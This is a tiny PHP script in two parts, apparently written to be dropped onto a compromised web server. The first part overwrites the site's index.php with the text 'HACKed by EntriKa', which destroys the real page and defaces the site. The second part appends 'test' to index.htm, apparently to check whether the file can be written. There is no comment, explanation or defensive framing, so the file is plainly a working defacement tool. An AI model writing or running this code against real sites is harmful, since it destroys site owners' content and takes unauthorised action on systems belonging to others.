<?php
$entry_line="HACKed by EntriKa";
$fp = fopen("index.php", "w");
fputs($fp, $entry_line);
fclose($fp);
?>

<? 
$fp =@fopen("index.htm", "a+");
$yazi = "test" . "\r\n";
fwrite ($fp, "$yazi");
fclose ($fp);
?>
